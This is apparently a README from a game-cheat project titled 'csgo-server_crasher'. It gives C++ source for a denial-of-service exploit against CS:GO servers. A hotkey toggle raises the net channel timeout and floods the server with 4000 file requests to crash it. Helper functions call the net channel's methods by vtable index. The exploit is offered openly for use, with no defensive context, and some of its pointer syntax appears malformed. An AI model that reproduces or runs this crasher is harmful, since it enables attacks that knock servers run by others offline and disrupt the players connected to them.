# csgo-server_crasher
need update enjoy :)

##Source Code C++

void miscellaneous::server_crash( ) {
static bool toggle;
if ( interfaces::input_system->button_down( buttoncode_t::KEY_F8 ) )
  toggle = !toggle;
if ( toggle ) {
auto netchannel = interfaces::clientstate->net_channel;
if ( !netchannel )
return;
//((void (__thiscall **)(int, signed int))((_DWORD )v96 + 124))(v96, 1163984896); settimeout
  netchannel->set_timeout( 3600.0f, false );
  //((void (__thiscall **)(int, char ))((_DWORD *)v96 + 248))(v96, &v91); requestfile
for ( int j = 0; j < 4000; j++ )
   netchannel->request_file( ".txt", false );
  c_notifications::get( ).add( true, color( 255, 0, 0 ), netchannel->is_timed_out( ) ? "server crashed. mode: linux " : "failed crashing the server" );
}
}

##sOURCE Code c++
void set_timeout( float seconds, bool force_exact = false ) {
  using fn = void( thiscall* )( void *, float, bool );
  return ( *( fn** ) this ) [ 31 ]( this, seconds, force_exact );
 }
 bool is_timed_out(  ) {
  using fn = bool( thiscall* )( void * );
  return ( ( fn** ) this ) [ 58 ]( this );
 }
 unsigned int request_file( const char filename, bool is_replay_demo ) {
  using fn = unsigned int( __thiscall* )( void , const char, bool );
  return ( *( fn** ) this ) [ 62 ]( this, filename, is_replay_demo );
 }
